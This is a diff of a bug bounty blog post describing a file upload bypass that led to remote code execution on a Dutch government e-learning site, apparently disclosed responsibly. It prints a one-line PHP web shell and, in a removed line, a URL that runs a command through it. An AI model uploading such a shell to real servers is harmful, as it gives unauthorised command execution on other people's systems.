@@ -8,7 +8,7 @@ excerpt: How I bypassed File upload to achieve Remote Code Execution (RCE) vulne
 
 ## Introduction
 
-Assalamu Alaikum! This is Nayeem Islam. I'm a currently an undergrad student and a passionate webapp security learner from Bangladesh. 
+Assalamu Alaikum! This is Nayeem Islam. I'm currently an undergrad student and a passionate webapp security learner from Bangladesh. 
 
 This is my first write-up and I'll be sharing how I bypassed File upload to achieve Remote Code Execution (RCE) vulnerability on a Dutch government website. You can skip my background story and head to the [exploitation](#file-upload-bypass) part ahead.
 
@@ -32,11 +32,11 @@ Additionally, I noticed the e-learning portal was built using the PHP Laravel fr
 
 So my target was `elearning.example.nl`. I registered an account, explored my profile and tested for XSS, HTML injection, CSRF, but came up empty-handed.
 
-Then I started testing profile picture upload feature. I tried uploading a simple `test.txt` file & the upload was successful. However, my joy was vanished as I discovered an error when attempting to view the uploaded image.
-```
-There is an error with this image file
-``` 
-You can see below my `txt` file has been renamed and converted to `jpg`. 😥 
+Then I started testing profile picture upload feature. I tried uploading a simple `test.txt` file & the upload was successful. However, my joy was vanished as I discovered the following error when attempting to view the uploaded image.
+
+`There is an error with this image file`
+
+You can see below my `txt` file has been renamed and converted to `jpg` as well. 😥 
 
 ![Dutch Government bug bounty](https://i.postimg.cc/J0VMKYL7/url1.png "Dutch Responsible Disclosure")
 
@@ -46,11 +46,11 @@ This time I paid close attention to the sub directory `conversion` in the URL. I
 
 I attempted to access the uploaded `text` file directly from `/528/`, resulting in a URL like this
 
- ```URL
- https://elearning.example.nl/storage/528/my-image.txt
- ``` 
+ ![Dutch Government swag](https://i.postimg.cc/s22cxyhV/url.png "Dutch Responsible Disclosure")
 
-My assumption was right. The `TXT` file executed! I documented my findings with a Proof of Concept (PoC) and submitted my report.
+My assumption was right. The `TXT` file executed! I documented my findings with a Proof of Concept (PoC) and submitted my initaal report.
+
+Meanwhile, I was exploring ways to further exploit the file upload feature and I came across this excellent [article](https://sm4rty.medium.com/hunting-for-bugs-in-file-upload-feature-c3b364fb01ba).
 
 ## Exploiting RCE
 
@@ -59,30 +59,23 @@ Later, I learned about File Upload to RCE. Then uploaded this simple one liner p
 ```php
 <?php system($_GET['cmd']); ?>
 ``` 
-Opened profile image in a new tab and modified the URL like this.
-```URL
-https://elearning.example.nl/storage/528/shell.php?cmd=id
-```
-The outcome? Voilà! I had successfully achieved Remote Code Execution. 😎
+Opened profile image in a new tab and modified the URL with RCE command. The outcome? Voilààà! I had successfully achieved Remote Code Execution. 😎
 
 ![Dutch Government bug bounty](https://i.postimg.cc/TYfffc6F/rce-1.png "Dutch Responsible Disclosure")
 
-Send additional report to prove impact the impact of this newfound vulnerability.
+Send additional report to prove the impact of this newfound vulnerability.
 
 ## End Story
 
 I was happy and hopeless at the same time. This discovery seemed too easy, raising the possibility of it being a duplicate. To my surprise, my report was triaged! NCSC-NL also advised me not to upload shell on their system! 😜
 
-![Dutch Government bug bounty](https://i.postimg.cc/HnGMFG3v/Untitled.png "Dutch Responsible Disclosure")
+![Dutch Government bug bounty](https://i.postimg.cc/MTCh2tGJ/Untitled-Copy.png "Dutch Responsible Disclosure"){: .left }
 
 This issue was resolved within a month and I was awarded the Dream Swag! It was my first critical finding on a real target as well as my first ever bug submission on the Dutch Government. I thought I was lucky but I was wrong. My swag got lost in the shipment. 😞
 
 Before this discovery, I had never completed a single Portswigger lab on File Upload or Command Execution, except for basic TryHackMe rooms.
 
-They say, 
-> Enjoy the journey, not just the destination.
-
-How true that turned out to be. I learned a ton of lessons throughout this journey.<br><br>
+They say, "Enjoy the journey, not just the destination." How true that turned out to be. I learned a ton of lessons throughout this journey.<br>
 
 ### Timeline 
 
@@ -103,5 +96,4 @@ Thank you for taking the time to read this lengthy blog.
 You can follow me on
 
 - Twitter  : https://twitter.com/nayeems3c
-- LinkedIn : https://www.linkedin.com/in/nayeem-islam-a496011a2/
 
